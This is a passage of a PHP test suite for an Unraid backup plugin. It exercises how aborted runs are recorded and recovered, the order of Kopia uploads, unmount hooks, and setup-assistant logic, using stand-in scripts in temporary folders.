    same('array stop: a check ends the same way, without a notification', ['aborted', 'array_stopping', []], [$status()['result'] ?? null, $status()['message'] ?? null, $notes()]);

    // --- the office reading such a run
    $hist = "$tmp/history.jsonl";
    $good = ['run' => '20261006-0300', 'mode' => 'backup', 'started' => 1000, 'finished' => 1500, 'result' => 'ok', 'errors' => 0, 'warnings' => 0,
             'kopia' => ['done' => array_map(fn ($p) => ['name' => $p, 'ok' => true, 'seconds' => 10, 'finished' => 1400], $plan)]];
    file_put_contents($hist, json_encode($good) . "\n" . $abortedLine . "\n");
    $history = backupHistory([], null, $skips, $hist);
    $r = $history[0];
    same('office: the stopped run is a run — aborted, array_stopping, the skipped and the interrupted source',
        ['aborted', 'array_stopping', array_slice($plan, 1), $second, 1], [$r['result'], $r['message'], $r['kopia_skipped'] ?? null, $r['kopia_interrupted'] ?? null, count($r['kopia'])]);
    $shares = array_column(backupShares(backupReadSettings("$data/settings.ini"), $history), null, 'name');
    same('office: a source the stop skipped keeps its last good time, never «failed»', [true, 1400], [$shares[$second]['last']['ok'] ?? null, $shares[$second]['last']['time'] ?? null]);
    same('office: estimates leave the stopped run out', 500, backupEstimates($history)['total']);
    require_once OFFICE_DIR . '/src/dashboard.php';
    same('dashboard: a run stopped by the array stop — orange, its own words, not «failed»', ['backup.dash_array_stop', 'orange', (int) ($r['finished'] ?: $r['started'])],
        officeDashBackupState(['history' => $history, 'skips' => []]));
    same('dashboard: a run stopped by hand stays as before', ['dash.bk_failed', 'red', 5], officeDashBackupState(['history' => [['result' => 'aborted', 'message' => 'signal', 'started' => 1, 'finished' => 5]]]));
    @mkdir("$tmp/mstate", 0700, true);
    file_put_contents("$tmp/mstate/last-run.json", $abortedLine);
    $bk = [];
    foreach (backupMetrics("$tmp/mstate") as $fam) {
        $bk[$fam['name']] = $fam['samples'];
    }
    same('metrics: the skipped sources counted apart, none failed', [[['result' => 'ok'], 1], [['result' => 'failed'], 0], [['result' => 'skipped'], 2]], $bk['uso_backup_last_kopia_sources'] ?? null);

    // --- engine 2.25: the Kopia order. An app (c1) and a VM (vmpause) with sources of their own; sizes: appdata 3 GB by
    // ZFS but a stale 500 B complete Kopia snapshot (its first real upload still in checkpoints) - goes by ZFS; docs 1000 B
    // by ZFS but 2 MB by Kopia (compressed on the pool) - goes by Kopia; the backup place 50 MB by ZFS, the VM's 1 MB disk
    // file; a Kopia checkpoint (incomplete) and another identity's snapshot don't count
    file_put_contents("$data/settings.ini", "[app \"c1\"]\nkopia = yes\nfolder = appdata/c1\n[vm \"vmpause\"]\nkopia = yes\nfolder = domains/vmpause\n", FILE_APPEND);
    $zs = fn ($n, $mp, $ref) => "$n\t$mp\ton\t" . crc32($n) . "\t$ref\t-\n";
    file_put_contents("$fake/zfs.txt", $zs('master', $pool, 1) . $zs('master/appdata', "$pool/appdata", 3000000000) . $zs('master/docs', "$pool/docs", 1000)
        . $zs('master/domains', "$pool/domains", 7) . $zs('master/UnraidSecretaryOffice', "$pool/UnraidSecretaryOffice", 50000000));
    $ksnap = fn ($path, $size, $start, $more = []) => ['source' => ['host' => 'kopia', 'userName' => 'root', 'path' => $path], 'startTime' => $start,
        'stats' => ['totalSize' => $size]] + $more;
    file_put_contents("$fake/snaplist.json", json_encode([$ksnap('/uso/appdata', 9000000000, '2026-10-01T01:00:00Z'), $ksnap('/uso/appdata', 500, '2026-10-06T01:00:00Z'),
        $ksnap('/uso/docs', 2000000, '2026-10-06T01:00:00Z'), $ksnap('/uso/docs', 1, '2026-10-07T01:00:00Z', ['incompleteReason' => 'checkpoint']),
        ['source' => ['host' => 'other', 'userName' => 'root', 'path' => '/uso/UnraidSecretaryOffice'], 'startTime' => '2026-10-06T01:00:00Z', 'stats' => ['totalSize' => 1]]]));
    file_put_contents("$pool/domains/vmpause/vdisk1.img", str_repeat("\x5a", 1 << 20));
    // the fixture mounts nothing for real: what the sources of their own bind lies ready in the share's mount point
    foreach (["$root/appdata/c1" => 'config.xml', "$root/domains/vmpause" => 'vdisk1.img'] as $dir => $file) {
        @mkdir($dir, 0700, true);
        file_put_contents("$dir/$file", 'x');
    }
    $night();
    [$code, , $out] = $run();
    $s = $status();
    $want = ['app:c1', 'vm:vmpause', 'docs', 'UnraidSecretaryOffice', 'appdata'];
    same('kopia order: status.json planned - the app first, then shares and the VM by the larger size, appdata (stale tiny Kopia snapshot, 3 GB by ZFS) last',
        $want, $s['kopia']['planned'] ?? null);
    same('kopia order: uploaded in that order', ['/uso/.apps/c1', '/uso/.vms/vmpause', '/uso/docs', '/uso/UnraidSecretaryOffice', '/uso/appdata'],
        array_values(array_map(fn ($w) => substr($w, strlen('kopia start ')), preg_grep('/^kopia start /', $names()))));
    same('kopia order: done in that order', $want, array_column($s['kopia']['done'] ?? [], 'name'));
    check('kopia order: the plan says it once, with the sizes and where they come from',
        (bool) preg_match('/Kopia order: +app:c1, vm:vmpause [0-9.]+MB?\*, docs [0-9.]+MB, UnraidSecretaryOffice [0-9.]+MB?\*, appdata [0-9.]+GB\*\n/', $log())
        && substr_count($log(), 'Kopia order:') === 1, $log());
    @unlink("$fake/snaplist.json");

    // --unmount from the plugin's array-stop hook (UB_KEEP_LATEST=1) leaves latest.log at the run's log; by hand it points to unmount.log
    $runLog = @readlink("$data/logs/latest.log");
    $unmount = fn (string $extra) => shell_exec('bash -c ' . escapeshellarg("$env $extra; bash " . escapeshellarg(OFFICE_DIR . '/backup/backup.sh') . ' --unmount </dev/null >/dev/null 2>&1'));
    $unmount('UB_KEEP_LATEST=1');
    $kept = @readlink("$data/logs/latest.log");
    $unmount('');
    same('unmount: from the array-stop hook latest.log stays the run\'s, by hand it is unmount.log', [true, $runLog, 'unmount.log'],
        [str_starts_with((string) $runLog, 'run-'), $kept, @readlink("$data/logs/latest.log")]);

    // --- engine 2.25: backup.sh --recover
    $rec = function (string $extra = '') use ($env): array {
        $out = (string) shell_exec('bash -c ' . escapeshellarg("$env UB_RECOVER_LOOK=1 $extra; bash " . escapeshellarg(OFFICE_DIR . '/backup/backup.sh') . " --recover </dev/null; echo \"exit=\$?\"") . ' 2>&1');
        preg_match('/exit=(\d+)\s*$/', $out, $m);
        return [(int) ($m[1] ?? -1), $out];
    };
    $sums = fn () => array_map(fn ($f) => @md5_file("$data/state/$f") ?: null, ['status.json', 'last-run.json', 'history.jsonl', 'skipped.json']);
    $noted = fn () => array_map(fn ($f) => (string) @file_get_contents("$data/state/$f"), ['stopped', 'maintenance', 'vms']);
    $recLog = fn () => (string) @file_get_contents("$data/logs/recover.log");
    $fresh = function () use ($fake): void {
        foreach (['events', 'notify.log', 'docker.down'] as $f) {
            @unlink("$fake/$f");
        }
    };
    // nothing noted (a run that went well): nothing done, nothing written
    $fresh();
    $before = $sums();
    [$code, $out] = $rec();
    same('recover: nothing noted - exit 0, nothing done, no log, no lock note, the run\'s files untouched', [0, [], false, false, $before],
        [$code, $names(), is_file("$data/logs/recover.log"), is_file("$data/state/lock-holder.json"), $sums()]);
    // the array being stopped: not now
    file_put_contents("$data/state/stopped", "c1\n");
    file_put_contents("$fake/ct/c1", "stopped\n");
    file_put_contents("$fake/var.ini", "fsState=\"Stopping\"\n");
    [$code, $out] = $rec();
    same('recover: the array being stopped - exit 3, nothing started, the note kept, nothing written', [3, [], "c1\n", false, $before],
        [$code, $names(), $noted()[0], is_file("$data/logs/recover.log"), $sums()]);
    file_put_contents("$fake/var.ini", "fsState=\"Started\"\n");
    // the lock busy: a run holds it (it brings the notes back itself) - quietly
    $lk = fopen("$data/state/lock", 'c');
    flock($lk, LOCK_EX);
    $t0 = microtime(true);
    [$code, $out] = $rec();
    $took = microtime(true) - $t0;
    flock($lk, LOCK_UN);
    fclose($lk);
    same('recover: the lock busy - exit 75 at once, nothing started, the note kept, no notification, nothing written',
        [75, true, [], "c1\n", [], false, $before], [$code, $took < 5, $names(), $noted()[0], $notes(), is_file("$data/logs/recover.log"), $sums()]);

    // what a run the array stop ended left: brought back right after the array start
    $night('suspend');
    $run();
    same('recover: the stopped run left its notes', ["c1\nnc\n", "nc\n", "vmshut|shutdown\n"], $noted());
    file_put_contents("$fake/var.ini", "fsState=\"Started\"\n");
    @unlink("$fake/stop-at");
    $fresh();
    $before = $sums();
    $latest = @readlink("$data/logs/latest.log");
    [$code, $out] = $rec();
    same('recover: after the array start - the containers and the VM started, Nextcloud out of maintenance mode, exit 0',
        [0, ['docker start c1', 'docker start nc', 'occ maintenance off', 'virsh start vmshut']], [$code, $names()]);
    same('recover: the notes gone, the lock free, its note gone', [['', '', ''], true, false], [$noted(), $lockFree(), is_file("$data/state/lock-holder.json")]);
    same('recover: no run - status.json, last-run.json, history.jsonl, skipped.json untouched, latest.log still the run\'s', [$before, $latest],
        [$sums(), @readlink("$data/logs/latest.log")]);
    $nt = $notes();
    check('recover: one notification «Aborted run repaired», normal after an array stop, naming what came back', count($nt) === 1 && str_contains($nt[0], '-i normal')
        && str_contains($nt[0], 'Aborted run repaired') && str_contains($nt[0], 'c1 nc maintenance mode nc off VM vmshut started'), json_encode($nt));
    check('recover: its log says what was noted and that it is done', str_contains($recLog(), "- recover ") && str_contains($recLog(), 'containers c1 nc; maintenance mode nc; VMs vmshut')
        && str_contains($recLog(), 'Done - nothing is noted any more'), $recLog());

    // Docker silent: the containers' note stays (before 2.25 it went - the container looked running), the VM comes back
    $night();
    touch("$fake/docker.down");
    file_put_contents("$data/state/stopped", "c1\n");
    file_put_contents("$fake/ct/c1", "stopped\n");
    file_put_contents("$data/state/vms", "vmshut|shutdown\n");
    file_put_contents("$fake/vm/vmshut.state", "shut off\n");
    touch("$data/state/vms", time() + 60);          // a later run's notes (killed): newer than the run the array stop ended
    [$code, $out] = $rec('UB_RECOVER_WAIT=2');
    same('recover: Docker silent - exit 1, the containers\' note kept, the VM started all the same', [1, ['virsh start vmshut'], ["c1\n", '', '']], [$code, $names(), $noted()]);
    check('recover: Docker silent - said in its log', str_contains($recLog(), 'Docker did not answer within 2 s') && str_contains($recLog(), 'stays noted for the next start'), $recLog());
    $nt = $notes();
    check('recover: notes newer than the run the array stop ended (a crash) - the notification is a warning', count($nt) === 1 && str_contains($nt[0], '-i warning')
        && str_contains($nt[0], 'An earlier run was aborted'), json_encode($nt));

    // a run that finds a recover holding the lock waits for it instead of skipping the night
    $night();
    touch("$fake/docker.down");
    file_put_contents("$data/state/stopped", "c1\n");
    file_put_contents("$fake/ct/c1", "stopped\n");
    @unlink("$data/state/skipped.json");
    $bg = fn (string $what) => proc_open(['bash', '-c', "$env $what </dev/null >/dev/null 2>&1"], [], $pipes);
    $recP = $bg('UB_RECOVER_LOOK=1 UB_RECOVER_WAIT=30; exec bash ' . escapeshellarg(OFFICE_DIR . '/backup/backup.sh') . ' --recover');
    for ($i = 0; $i < 50 && (json_decode((string) @file_get_contents("$data/state/lock-holder.json"), true)['mode'] ?? '') !== 'recover'; $i++) {
        usleep(100000);
    }
    $chkP = $bg('UB_RECOVER_LOCK_WAIT=60; exec bash ' . escapeshellarg(OFFICE_DIR . '/backup/backup.sh') . ' --check');
    usleep(1500000);
    $waiting = proc_get_status($chkP)['running'] && !is_file("$data/state/status.json") && !is_file("$data/state/skipped.json");
    @unlink("$fake/docker.down");
    $codes = [];
    foreach (['recover' => $recP, 'check' => $chkP] as $k => $p) {
        for ($i = 0; $i < 600 && ($st = proc_get_status($p))['running']; $i++) {
            usleep(100000);
        }
        $codes[$k] = $st['running'] ? null : $st['exitcode'];
        proc_close($p);
    }
    $s = $status();
    same('recover: a check started meanwhile waits for it, then runs - not skipped',
        [true, ['recover' => 0, 'check' => 0], 'check', true, false, ['docker start c1']],
        [$waiting, $codes, $s['mode'] ?? null, in_array($s['result'] ?? '', ['ok', 'warnings', 'errors'], true), is_file("$data/state/skipped.json"), $names()]);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Engine 2.25: the order of the Kopia phase (kopia_order) - the flash first, the apps' own sources in their order, then the
 * shares and the VMs' own sources by their expected size (the newest complete Kopia snapshot's, else the server's), unknown
 * last; and where those sizes come from (kopia_sizes_load: one «snapshot list», a stand-in docker on PATH).
 */
function testBackupKopiaOrder(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-korder-' . getmypid();
    @mkdir("$tmp/bin", 0700, true);
    file_put_contents("$tmp/settings.ini", "[general]\ndumps_share = UnraidSecretaryOffice\nmount_root = /mnt/addons/UnraidSecretaryOffice/snapshots\n[kopia]\nenabled = yes\n");
    $ksnap = fn ($path, $size, $start, $more = []) => ['source' => ['host' => 'kopia', 'userName' => 'root', 'path' => $path], 'startTime' => $start,
        'stats' => ['totalSize' => $size]] + $more;
    file_put_contents("$tmp/list.json", json_encode([
        $ksnap('/uso/appdata', 9000000000, '2026-10-01T01:00:00Z'), $ksnap('/uso/appdata', 5000000000, '2026-10-06T01:00:00Z'),
        $ksnap('/uso/Backups', 1000, '2026-10-05T01:00:00Z'),       // complete but stale: all of it was ignored before the setup changed
        $ksnap('/uso/Backups', 10, '2026-10-07T03:00:00Z', ['incompleteReason' => 'checkpoint']),
        $ksnap('/uso/scripts', 3000000000, '2026-10-06T01:00:00Z'),
        ['source' => ['host' => 'other', 'userName' => 'root', 'path' => '/uso/isos'], 'startTime' => '2026-10-06T01:00:00Z', 'stats' => ['totalSize' => 1]],
        ['source' => ['host' => 'kopia', 'userName' => 'root', 'path' => '/uso/.vms/Debian'], 'startTime' => '2026-10-06T01:00:00Z', 'rootEntry' => ['summ' => ['size' => 7]]]]));
    file_put_contents("$tmp/bin/docker", "#!/bin/bash\n[[ \"\$*\" == *'snapshot list --all --json -n 1'* ]] && cat $tmp/list.json\n");
    chmod("$tmp/bin/docker", 0755);
    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
    $sh = function (string $script) use ($lib, $tmp): string {
        $pre = "PATH=$tmp/bin:\$PATH UB_DATA=$tmp/data; source $lib >/dev/null 2>&1; cfg_load $tmp/settings.ini; apply_settings;"
             . ' KM_SRC=(/mnt/addons/UnraidSecretaryOffice/snapshots); KM_DST=(/uso); KM_RW=(false); KM_PROP=(rslave);'
             . ' PLAN_FLASH=snapshot; PLAN_KOPIA=(isos appdata docs Backups scripts);'
             . ' PLAN_KITEMS=("app|nextcloud|nextcloud" "app|immich|immich" "vm|Win 11|Win_11" "vm|Debian|Debian" "vm|Tiny|Tiny");'
             . ' INV_BYTES=([appdata]=40000000000 [docs]=1000000000 [Backups]=2300000000000 [scripts]=1000000000);'
             . ' VM_BYTES=(["Win 11"]=380000000000 [Tiny]=4000000000);';
        return trim((string) shell_exec('bash -c ' . escapeshellarg("$pre $script") . ' 2>&1'));
    };
    same('kopia order: the newest complete snapshot of this identity per source - no checkpoint, no other identity; rootEntry\'s size when stats lack',
        "/uso/.vms/Debian=7 /uso/Backups=1000 /uso/appdata=5000000000 /uso/scripts=3000000000",
        $sh('KOPIA_CONNECTED=yes KOPIA_USER=root KOPIA_HOST=kopia KOPIA_RUN_UID=0 KOPIA_CONTAINER=kopia; kopia_sizes_load;'
            . ' for k in $(printf "%s\n" "${!KSIZE[@]}" | LC_ALL=C sort); do printf "%s=%s " "$k" "${KSIZE[$k]}"; done'));
    same('kopia order: no sizes from Kopia while it isn\'t connected', '0', $sh('KOPIA_CONNECTED=no; kopia_sizes_load; echo ${#KSIZE[@]}'));
    same('kopia order: the flash, the apps in their order, then shares and VMs the smallest first - by the larger of Kopia\'s and the server\'s size '
        . '(a stale tiny Kopia snapshot of a huge share goes by the server\'s), either alone when only one is known, unknown last in their order',
        "flash|flash||||\napp:nextcloud|app|nextcloud|nextcloud||\napp:immich|app|immich|immich||\n"
        . "vm:Debian|vm|Debian|Debian|7|kopia\ndocs|share|docs||1000000000|inventory\nscripts|share|scripts||3000000000|kopia\n"
        . "vm:Tiny|vm|Tiny|Tiny|4000000000|inventory\nappdata|share|appdata||40000000000|inventory\nvm:Win 11|vm|Win 11|Win_11|380000000000|inventory\n"
        . "Backups|share|Backups||2300000000000|inventory\nisos|share|isos|||",
        $sh('KOPIA_CONNECTED=yes KOPIA_USER=root KOPIA_HOST=kopia KOPIA_RUN_UID=0 KOPIA_CONTAINER=kopia; kopia_sizes_load; kopia_order'));
    same('kopia order: the larger size wins, equal goes to Kopia\'s', ['5|kopia', '7|inventory', '4|kopia', '9|inventory', '|'],
        explode(' ', $sh('for a in "5 4" "3 7" "4 4" "x 9" "x x"; do set -- $a; [[ $1 == x ]] && set -- "" "$2"; [[ $2 == x ]] && set -- "$1" ""; printf "%s " "$(kopia_expect "$1" "$2")"; done')));
    same('kopia order: without the flash\'s snapshot no flash; without sizes the shares, then the VMs, as listed',
        "app:nextcloud\napp:immich\nisos\nappdata\ndocs\nBackups\nscripts\nvm:Win 11\nvm:Debian\nvm:Tiny",
        $sh('PLAN_FLASH=tar; INV_BYTES=(); VM_BYTES=(); kopia_order | cut -d"|" -f1'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The plugin's array hooks for the backup engine (agent.sh, engine 2.25): at the array start a backup.sh --recover handed to
 * atd when a stopped run left notes (with the office's mark, so the night watchman knows it), at the array stop the
 * engine's mounts left between runs released (backup.sh --unmount) unless a run holds the lock or nothing is mounted.
 * agent.sh sourced with its paths pointed at a test folder; at and backup.sh are stand-ins - nothing reaches atd or a mount.
 */
function testAgentBackupHooks(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-agenthooks-' . getmypid();
    exec('rm -rf ' . escapeshellarg($tmp));
    $data = "$tmp/da'ta";              // a quote in the path: the job quotes it
    $ub = "$data/unraid-backup";
    foreach (["$tmp/bin", "$tmp/plugin/backup", "$tmp/run", "$ub/state", "$tmp/atjobs"] as $d) {
        @mkdir($d, 0700, true);
    }
    file_put_contents("$tmp/bin/at", "#!/bin/bash\necho \"\$*\" >>" . escapeshellarg("$tmp/at.calls") . "\ncp \"\$3\" " . escapeshellarg("$tmp/at.job") . "\n");
    chmod("$tmp/bin/at", 0755);
    file_put_contents("$tmp/plugin/backup/backup.sh", "echo \"\$UB_DATA \${UB_KEEP_LATEST:-} \$*\" >>" . escapeshellarg("$tmp/backup.calls") . "\n");
    $agent = escapeshellarg(OFFICE_DIR . '/plugin/scripts/agent.sh');
    $call = function (string $fn) use ($tmp, $agent, $data): string {
        $pre = 'PATH=' . escapeshellarg("$tmp/bin") . ":\$PATH; source $agent; DIR=" . escapeshellarg("$tmp/plugin") . '; RUN=' . escapeshellarg("$tmp/run")
             . '; LOG=' . escapeshellarg("$tmp/agent.log") . '; PROC_MOUNTS=' . escapeshellarg("$tmp/mounts") . '; BACKUP_STAGE=' . escapeshellarg("$tmp/stage")
             . '; data_dir() { echo ' . escapeshellarg($data) . '; };';
        return trim((string) shell_exec('bash -c ' . escapeshellarg("$pre $fn") . ' 2>&1'));
    };
    $read = fn (string $f) => (string) @file_get_contents("$tmp/$f");

    // array started
    same('hooks: sourcing agent.sh does nothing but define', '', $call(''));
    $call('backup_recover');
    same('hooks: started, nothing noted - nothing handed to atd', '', $read('at.calls'));
    file_put_contents("$ub/state/vms", "vm1|shutdown\n");
    $call('backup_recover');
    same('hooks: started, a note - handed to atd now, never mailed', "-M -f $tmp/run/backup-recover.sh now\n", $read('at.calls'));
    $job = explode("\n", $read('at.job'));
    same('hooks: the job carries the office\'s mark (the same as hostLaunch()\'s) on its own line', ['#!/bin/sh', HOST_LAUNCH_MARK], array_slice($job, 0, 2));
    exec('sh ' . escapeshellarg("$tmp/at.job"), $o, $rc);
    same('hooks: the job runs backup.sh --recover with the engine\'s data folder (quoted)', [0, "$ub  --recover\n"], [$rc, $read('backup.calls')]);
    file_put_contents("$tmp/atjobs/a0000101c2b3a4", "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\ncd / || {\n\t exit 1\n}\n" . $read('at.job'));
    same('hooks: the night watchman takes the at job for the office\'s', true, watchmanAtJobs(['atjobs' => "$tmp/atjobs"], null)['jobs']['a0000101c2b3a4']['ours'] ?? null);
    @unlink("$tmp/backup.calls");

    // array stopping
    file_put_contents("$ub/settings.ini", "[general]\nmount_root = $tmp/snaps\nkeep_mounts = yes\n[share \"x\"]\nmount_root = $tmp/elsewhere\n");
    file_put_contents("$tmp/mounts", "master /mnt/master zfs rw 0 0\n");
    $call('backup_release');
    same('hooks: stopping, nothing of the engine mounted - backup.sh not called', '', $read('backup.calls'));
    file_put_contents("$tmp/mounts", "master /mnt/master zfs rw 0 0\nmaster/appdata@uso-backup-1 $tmp/elsewhere/appdata zfs ro 0 0\n");
    $call('backup_release');
    same('hooks: stopping, a mount under another section\'s «mount_root» is none of the engine\'s', '', $read('backup.calls'));
    file_put_contents("$tmp/mounts", "master /mnt/master zfs rw 0 0\nmaster/appdata@uso-backup-1 $tmp/snaps/appdata zfs ro 0 0\n");
    $lk = fopen("$ub/state/lock", 'c');
    flock($lk, LOCK_EX);
    $call('backup_release');
    flock($lk, LOCK_UN);
    fclose($lk);
    same('hooks: stopping, a run holds the lock - it unmounts itself, backup.sh not called', '', $read('backup.calls'));
    $call('backup_release');
    same('hooks: stopping, its snapshot mounted (keep_mounts) and the lock free - backup.sh --unmount with its data folder, latest.log left alone',
        "$ub 1 --unmount\n", $read('backup.calls'));
    @unlink("$tmp/backup.calls");
    file_put_contents("$tmp/mounts", "unraid-backup-stage $tmp/stage tmpfs rw 0 0\nmaster/appdata@uso-backup-1 $tmp/stage/layers/master_appdata zfs ro 0 0\n");
    $call('backup_release');
    same('hooks: stopping, a layer in its staging area mounted - released too', "$ub 1 --unmount\n", $read('backup.calls'));
    @unlink("$tmp/backup.calls");
    file_put_contents("$tmp/mounts", "unraid-backup-stage $tmp/stage tmpfs rw 0 0\n");
    $call('backup_release');
    same('hooks: stopping, only the staging area itself (a tmpfs for the boot) - nothing to do', '', $read('backup.calls'));
    file_put_contents("$tmp/plugin/backup/backup.sh", "sleep 30\n");
    file_put_contents("$tmp/mounts", "master/appdata@uso-backup-1 $tmp/snaps/appdata zfs ro 0 0\n");
    $t0 = microtime(true);
    $call('backup_release');
    check('hooks: stopping, a hanging unmount is cut off - the array stop waits at most 10 s', microtime(true) - $t0 < 12, (string) (microtime(true) - $t0));
    check('hooks: agent.sh writes the mark exactly like hostLaunch()', str_contains((string) file_get_contents(OFFICE_DIR . '/plugin/scripts/agent.sh'), "HOST_LAUNCH_MARK='" . HOST_LAUNCH_MARK . "'"));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Engine 2.21 in the office: what waits for a decision (backupWaiting - folders decided since drop out, apps by
 * compose project, VMs without settings), a new folder's protection (only local), and the setup assistant's
 * logic run by node (Unraid ships it; skipped where it is missing): new apps and VMs at most local and kept
 * running, a new folder nobody owns proposed «only local», the apply dialog's group «New».
 */
function testBackupNewLocalOffice(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-newlocal-office-' . getmypid();
    @mkdir($tmp, 0700, true);
    file_put_contents("$tmp/s.ini", "[general]\ndumps_share = UnraidSecretaryOffice\n[docker]\nknown = c1\nknown = kopia\nknown = nc-app\n[kopia]\nenabled = yes\ncontainer = kopia\n"
        . "[share \"appdata\"]\nmode = kopia\nkopia_ignore = /kopia/\nkopia_ignore = /we ird?1?/\nkopia_known = /c1/\nkopia_known = /decided/\n"
        . "[share \"UnraidSecretaryOffice\"]\nmode = kopia\nkopia_known =\n[share \"old\"]\nmode = kopia\n[share \"loc\"]\nmode = snapshot\n[vm \"oldvm\"]\nmode = snapshot\n");
    $s = backupReadSettings("$tmp/s.ini");
    file_put_contents("$tmp/new-local.json", json_encode(['interface' => 1, 'folders' => [
        ['share' => 'appdata', 'folder' => 'bitcoin', 'bytes' => 5, 'first_seen' => 100], ['share' => 'appdata', 'folder' => 'decided'],
        ['share' => 'appdata', 'folder' => 'we ird[1]'], ['share' => 'appdata', 'folder' => 'a/b'], ['share' => 'loc', 'folder' => 'x'],
        ['share' => 'old', 'folder' => 'x'], 'odd']]));
    $w = backupWaiting($s, [['name' => 'oldvm', 'configured' => true], ['name' => 'newvm', 'configured' => false]],
        ['c1' => '', 'kopia' => '', 'nc-app' => 'nextcloud', 'nc-redis' => 'nextcloud', 'btc' => '', 'imm-a' => 'immich', 'imm-b' => 'immich'], "$tmp/new-local.json");
    same('office waiting: folders still undecided (decided, ignored, unwatched ones drop out)', [['appdata', 'bitcoin', 5, 100]],
        array_map(fn ($f) => [$f['share'], $f['folder'], $f['bytes'], $f['first_seen']], $w['folders']));
    same('office waiting: new apps - none of their containers known (a known stack with a new member is not new)', ['btc', 'immich'], $w['apps']);
    same('office waiting: new VMs', ['newvm'], $w['vms']);
    same('office waiting: nothing before the first setup', ['folders' => [], 'apps' => [], 'vms' => []], backupWaiting([], [['name' => 'v', 'configured' => false]], [], "$tmp/new-local.json"));
    same('protection: a recorded folder goes offsite, a new one only local, the backup place\'s folder always goes',
        ['offsite', 'local', 'local', 'offsite', 'offsite', 'offsite'],
        [backupProtection('/mnt/user/appdata/c1/x', 0, $s), backupProtection('/mnt/user/appdata/bitcoin', 0, $s), backupProtection('/mnt/user/appdata/kopia', 0, $s),
         backupProtection('/mnt/user/UnraidSecretaryOffice/backup/apps', 0, $s), backupProtection('/mnt/user/old/anything', 0, $s), backupProtection('/mnt/user/appdata', 0, $s)]);

    // the setup assistant, under node
    $node = trim((string) shell_exec('command -v node 2>/dev/null')) ?: (is_executable('/usr/local/bin/node') ? '/usr/local/bin/node' : '');
    if ($node === '') {
        check('office setup logic: node is missing here - skipped', true);
        exec('rm -rf ' . escapeshellarg($tmp));
        return;
    }
    $plan = [
        'time' => time(), 'have_settings' => true,
        'P' => ['kopia|enabled' => 'yes', 'general|dumps_share' => 'UnraidSecretaryOffice', 'docker|no_stop' => ['btc', 'nc-redis'], 'docker|skip' => [], 'docker|known' => ['c1', 'c2', 'c3', 'btc', 'nc-app', 'nc-redis'],
                'share|appdata|mode' => 'kopia', 'share|appdata|kopia_ignore' => ['/kopia/'], 'share|appdata|kopia_known' => ['/c1/', '/c2/', '/c3/', '/nc/'],
                'share|UnraidSecretaryOffice|mode' => 'kopia', 'share|UnraidSecretaryOffice|kopia_known' => ['/backup/'],
                'share|domains|mode' => 'snapshot', 'vm|oldvm|mode' => 'snapshot', 'vm|oldvm|prepare' => 'pause', 'vm|newvm|mode' => 'snapshot', 'vm|newvm|prepare' => 'none',
                'vm|sharedvm|mode' => 'snapshot', 'vm|sharedvm|prepare' => 'none'],
        'O' => ['kopia|enabled' => 'yes', 'general|dumps_share' => 'UnraidSecretaryOffice', 'docker|no_stop' => ['nc-redis'], 'docker|known' => ['c1', 'c2', 'c3', 'nc-app', 'nc-redis'],
                'share|appdata|mode' => 'kopia', 'share|appdata|kopia_ignore' => ['/kopia/'], 'share|UnraidSecretaryOffice|mode' => 'kopia', 'share|domains|mode' => 'snapshot',
                'vm|oldvm|mode' => 'snapshot', 'vm|oldvm|prepare' => 'pause'],
        'shares' => [
            ['name' => 'appdata', 'exists' => true, 'folders' => [['dir' => 'c1', 'container' => 'c1'], ['dir' => 'c2', 'container' => 'c2'], ['dir' => 'c3', 'container' => 'c3'],
                ['dir' => 'bitcoin', 'container' => 'btc'], ['dir' => 'nc', 'container' => 'nc-app']],
             'waiting' => [['dir' => 'bitcoin', 'bytes' => null, 'first_seen' => null], ['dir' => 'manual[1]', 'bytes' => 1024, 'first_seen' => 100]]],
            ['name' => 'UnraidSecretaryOffice', 'exists' => true, 'folders' => [], 'waiting' => []],
            ['name' => 'domains', 'exists' => true, 'folders' => [], 'waiting' => []]],
        'containers' => [
            ['name' => 'c1', 'why' => 'writes', 'previous' => true, 'binds' => [['share' => 'appdata', 'path' => 'c1', 'rw' => true]], 'volumes' => []],
            ['name' => 'c2', 'why' => 'writes', 'previous' => true, 'binds' => [['share' => 'appdata', 'path' => 'c2', 'rw' => true]], 'volumes' => []],
            ['name' => 'c3', 'why' => 'writes', 'previous' => true, 'binds' => [['share' => 'appdata', 'path' => 'c3', 'rw' => true]], 'volumes' => []],
            ['name' => 'btc', 'why' => 'new', 'previous' => false, 'binds' => [['share' => 'appdata', 'path' => 'bitcoin', 'rw' => true]], 'volumes' => []],
            ['name' => 'nc-app', 'project' => 'nextcloud', 'why' => 'writes', 'previous' => true, 'binds' => [['share' => 'appdata', 'path' => 'nc', 'rw' => true]], 'volumes' => []],
            ['name' => 'nc-redis', 'project' => 'nextcloud', 'why' => 'new', 'previous' => false, 'binds' => [], 'volumes' => []]],
        'vms' => [
            ['name' => 'oldvm', 'why' => 'previous', 'agent' => 'no', 'own' => ['master/domains/oldvm'], 'disks' => [['share' => 'domains', 'source' => '/mnt/master/domains/oldvm/vdisk1.img']]],
            ['name' => 'newvm', 'why' => 'new', 'agent' => 'no', 'own' => ['master/domains/newvm'], 'disks' => [['share' => 'domains', 'source' => '/mnt/master/domains/newvm/vdisk1.img']]],
            ['name' => 'sharedvm', 'why' => 'new', 'agent' => 'no', 'own' => [], 'disks' => [['share' => 'domains', 'source' => '/mnt/master/domains/sharedvm/vdisk1.img']]]],
        'databases' => [], 'nextcloud' => [], 'missing_databases' => [],
    ];
    file_put_contents("$tmp/plan.json", json_encode($plan));
    $js = <<<'JS'
const fs = require('fs');
globalThis.OFFICE_DESK_TESTS = {};
const T = (k, p) => k + (p ? ' ' + JSON.stringify(p) : '');
globalThis.Office = { scope: () => T, t: T, el: () => ({}), fmt: { size: (b) => b + ' B', relative: () => 'now' }, desk: () => {}, selbar: () => {}, has: () => false };
(0, eval)(fs.readFileSync(process.argv[2], 'utf8'));
const b = OFFICE_DESK_TESTS.backup;
b.setup.plan = JSON.parse(fs.readFileSync(process.argv[3], 'utf8'));
b.setupDraftFromPlan();
const d = b.setup.draft;
const out = {
  levels: b.setup.levels, held: b.setup.held,
